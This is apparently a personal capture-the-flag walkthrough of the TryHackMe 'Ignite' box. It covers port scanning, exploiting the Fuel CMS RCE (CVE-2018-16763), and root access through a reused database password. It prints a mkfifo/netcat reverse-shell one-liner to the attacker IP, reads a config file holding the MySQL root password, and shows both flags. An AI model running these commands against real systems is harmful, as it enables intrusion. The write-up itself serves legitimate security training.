- - - 
created : 19-07-2025 

Tags : #easy 
- - - 
# Objective

Root the box! Designed and created by [DarkStar7471](https://tryhackme.com/p/DarkStar7471), built by [Paradox](https://tryhackme.com/p/Paradox).
# Recon
## Rustscan/Nmap

We use [Rustscan](../../3%20-%20Tags/Hacking%20Tools/Rustscan.md) that will pass the result to [Nmap](../../3%20-%20Tags/Hacking%20Tools/Nmap.md) :

```
┌──(mdn0x㉿mdn0xonKali)-[~/THM/CHALLENGES/Easy/Ignite]
└─$ rustscan -a 10.10.182.218 -- -A 
.----. .-. .-. .----..---.  .----. .---.   .--.  .-. .-.
| {}  }| { } |{ {__ {_   _}{ {__  /  ___} / {} \ |  `| |
| .-. \| {_} |.-._} } | |  .-._} }\     }/  /\  \| |\  |
`-' `-'`-----'`----'  `-'  `----'  `---' `-'  `-'`-' `-'
The Modern Day Port Scanner.
________________________________________
: http://discord.skerritt.blog         :
: https://github.com/RustScan/RustScan :
 --------------------------------------
Scanning ports: The virtual equivalent of knocking on doors.

[~] The config file is expected to be at "/home/mdn0x/.rustscan.toml"
[!] File limit is lower than default batch size. Consider upping with --ulimit. May cause harm to sensitive servers
[!] Your file limit is very small, which negatively impacts RustScan's speed. Use the Docker image, or up the Ulimit with '--ulimit 5000'. 
Open 10.10.182.218:80

PORT   STATE SERVICE REASON         VERSION
80/tcp open  http    syn-ack ttl 63 Apache httpd 2.4.18 ((Ubuntu))
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Welcome to FUEL CMS
| http-robots.txt: 1 disallowed entry 
|_/fuel/
| http-methods: 
```

So we have just a [Website](../../3%20-%20Tags/Hacking%20Concepts/Website.md) .
# Enumeration

## HTTP (80)

We can start [Enumeration](../../3%20-%20Tags/Hacking%20Concepts/Enumeration.md) on the [Webpage](../../3%20-%20Tags/Hacking%20Concepts/Webpage.md) on port 80 :

![Pasted image 20250719210419.png](../../2%20-%20Resources/Others/Flameshots/Pasted%20image%2020250719210419.png)

So we go to /fuel and try these credentials :

![Pasted image 20250719210605.png](../../2%20-%20Resources/Others/Flameshots/Pasted%20image%2020250719210605.png)

Easy peasy.
# Exploit

[CVE-2018-16763](https://cve.mitre.org/cgi-bin/cvename.cgi?name=2018-16763)
## Searchsploit

We search for Fuel CMS with [Searchsploit](../../3%20-%20Tags/Hacking%20Tools/Searchsploit.md) :

```
┌──(mdn0x㉿mdn0xonKali)-[~/THM/CHALLENGES/Easy/Ignite]
└─$ searchsploit Fuel CMS      
-------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                  |  Path
-------------------------------------------------------------------------------- ---------------------------------
fuel CMS 1.4.1 - Remote Code Execution (1)                                      | linux/webapps/47138.py
Fuel CMS 1.4.1 - Remote Code Execution (2)                                      | php/webapps/49487.rb
Fuel CMS 1.4.1 - Remote Code Execution (3)                                      | php/webapps/50477.py
Fuel CMS 1.4.13 - 'col' Blind SQL Injection (Authenticated)                     | php/webapps/50523.txt
Fuel CMS 1.4.7 - 'col' SQL Injection (Authenticated)                            | php/webapps/48741.txt
Fuel CMS 1.4.8 - 'fuel_replace_id' SQL Injection (Authenticated)                | php/webapps/48778.txt
Fuel CMS 1.5.0 - Cross-Site Request Forgery (CSRF)                              | php/webapps/50884.txt
-------------------------------------------------------------------------------- ---------------------------------
Shellcodes: No Results

```

We can copy the RCE3 to our directory and use it :

```
┌──(mdn0x㉿mdn0xonKali)-[~/THM/CHALLENGES/Easy/Ignite]
└─$ python3 50128.py -u http://10.10.182.218 
python3: can't open file '/home/mdn0x/THM/CHALLENGES/Easy/Ignite/50128.py': [Errno 2] No such file or directory
                                                                                                                  
┌──(mdn0x㉿mdn0xonKali)-[~/THM/CHALLENGES/Easy/Ignite]
└─$ python3 50477.py -u http://10.10.182.218 
[+]Connecting...
Enter Command $id
systemuid=33(www-data) gid=33(www-data) groups=33(www-data)

```

Now we can obtain a [Shell](../../3%20-%20Tags/Hacking%20Concepts/Shell.md), first we open a listener with [Netcat](../../3%20-%20Tags/Hacking%20Tools/Netcat.md) :

```
nc -lvnp 1337
```

Then on the target we execute the following command :

```
rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/bash -i 2>&1 | nc 10.8.162.183 1337 >/tmp/f
```

And we have the shell in our listener but it's not stable so we'll going through a [Shell Stabilization](../../3%20-%20Tags/Hacking%20Concepts/Shell%20Stabilization.md) .

## Shell Stabilization

```
www-data@ubuntu:/$ python3 -c 'import pty;pty.spawn("/bin/bash")'
python3 -c 'import pty;pty.spawn("/bin/bash")'

www-data@ubuntu:/$ export TERM=xterm
export TERM=xterm

www-data@ubuntu:/$ ^Z
zsh: suspended  nc -lvnp 1337
                                                                                                                   
┌──(mdn0x㉿mdn0xonKali)-[~/THM/CHALLENGES/Easy/Ignite]
└─$ stty raw -echo; fg
[1]  + continued  nc -lvnp 1337
                               reset
www-data@ubuntu:/$ 

```

Now we have a more stabile shell to work with.
# Privilege Escalation

We can find the first flag :

```
www-data@ubuntu:/home$ cd www-data/
www-data@ubuntu:/home/www-data$ ls
flag.txt
www-data@ubuntu:/home/www-data$ cat flag.txt 
6470e394cbf6dab6a91682cc8585059b 
```

And continue with the [Privilege Escalation](../../3%20-%20Tags/Hacking%20Concepts/Privilege%20Escalation.md) to find the root flag, first thing we check for permissions with `sudo -l` but we don't have access without password .

One of the first things I checked was the database connection configuration file. On this host it was located at /var/www/html/fuel/application/config/database.php. This file contained the password for the root user for MySQL server :

```
www-data@ubuntu:/$ cat /var/www/html/fuel/application/config/database.php
<?php
defined('BASEPATH') OR exit('No direct script access allowed');

/*
| -------------------------------------------------------------------
| DATABASE CONNECTIVITY SETTINGS
| -------------------------------------------------------------------
| This file will contain the settings needed to access your database.
|
| For complete instructions please consult the 'Database Connection'
| page of the User Guide.
|
| -------------------------------------------------------------------
| EXPLANATION OF VARIABLES
| -------------------------------------------------------------------
|
|       ['dsn']      The full DSN string describe a connection to the database.
|       ['hostname'] The hostname of your database server.
|       ['username'] The username used to connect to the database
|       ['password'] The password used to connect to the database
|       ['database'] The name of the database you want to connect to
|       ['dbdriver'] The database driver. e.g.: mysqli.
|                       Currently supported:
|                                cubrid, ibase, mssql, mysql, mysqli, oci8,
|                                odbc, pdo, postgre, sqlite, sqlite3, sqlsrv
|       ['dbprefix'] You can add an optional prefix, which will be added
|                                to the table name when using the  Query Builder class
|       ['pconnect'] TRUE/FALSE - Whether to use a persistent connection
|       ['db_debug'] TRUE/FALSE - Whether database errors should be displayed.
|       ['cache_on'] TRUE/FALSE - Enables/disables query caching
|       ['cachedir'] The path to the folder where cache files should be stored
|       ['char_set'] The character set used in communicating with the database
|       ['dbcollat'] The character collation used in communicating with the database
|                                NOTE: For MySQL and MySQLi databases, this setting is only used
|                                as a backup if your server is running PHP < 5.2.3 or MySQL < 5.0.7
|                                (and in table creation queries made with DB Forge).
|                                There is an incompatibility in PHP with mysql_real_escape_string() which
|                                can make your site vulnerable to SQL injection if you are using a
|                                multi-byte character set and are running versions lower than these.
|                                Sites using Latin-1 or UTF-8 database character set and collation are unaffected.
|       ['swap_pre'] A default table prefix that should be swapped with the dbprefix
|       ['encrypt']  Whether or not to use an encrypted connection.
|
|                       'mysql' (deprecated), 'sqlsrv' and 'pdo/sqlsrv' drivers accept TRUE/FALSE
|                       'mysqli' and 'pdo/mysql' drivers accept an array with the following options:
|
|                               'ssl_key'    - Path to the private key file
|                               'ssl_cert'   - Path to the public key certificate file
|                               'ssl_ca'     - Path to the certificate authority file
|                               'ssl_capath' - Path to a directory containing trusted CA certificats in PEM format
|                               'ssl_cipher' - List of *allowed* ciphers to be used for the encryption, separated by colons (':')
|                               'ssl_verify' - TRUE/FALSE; Whether verify the server certificate or not ('mysqli' only)
|
|       ['compress'] Whether or not to use client compression (MySQL only)
|       ['stricton'] TRUE/FALSE - forces 'Strict Mode' connections
|                                                       - good for ensuring strict SQL while developing
|       ['ssl_options'] Used to set various SSL options that can be used when making SSL connections.
|       ['failover'] array - A array with 0 or more data for connections if the main should fail.
|       ['save_queries'] TRUE/FALSE - Whether to "save" all executed queries.
|                               NOTE: Disabling this will also effectively disable both
|                               $this->db->last_query() and profiling of DB queries.
|                               When you run a query, with this setting set to TRUE (default),
|                               CodeIgniter will store the SQL statement for debugging purposes.
|                               However, this may cause high memory usage, especially if you run
|                               a lot of SQL queries ... disable this to avoid that problem.
|
| The $active_group variable lets you choose which connection group to
| make active.  By default there is only one group (the 'default' group).
|
| The $query_builder variables lets you determine whether or not to load
| the query builder class.
*/
$active_group = 'default';
$query_builder = TRUE;

$db['default'] = array(
        'dsn'   => '',
        'hostname' => 'localhost',
        'username' => 'root',
        'password' => 'mememe',
        'database' => 'fuel_schema',
        'dbdriver' => 'mysqli',
        'dbprefix' => '',
        'pconnect' => FALSE,
        'db_debug' => (ENVIRONMENT !== 'production'),
        'cache_on' => FALSE,
        'cachedir' => '',
        'char_set' => 'utf8',
        'dbcollat' => 'utf8_general_ci',
        'swap_pre' => '',
        'encrypt' => FALSE,
        'compress' => FALSE,
        'stricton' => FALSE,
        'failover' => array(),
        'save_queries' => TRUE
);

// used for testing purposes
if (defined('TESTING'))
{
        @include(TESTER_PATH.'config/tester_database'.EXT);
}

```

If we try it on the machine we have root access :

```
www-data@ubuntu:/$ su root
Password: mememe

root@ubuntu:/# cat /root/root.txt
b9bbcb33e11b80be759c4e844862482d 
```

Pwned !!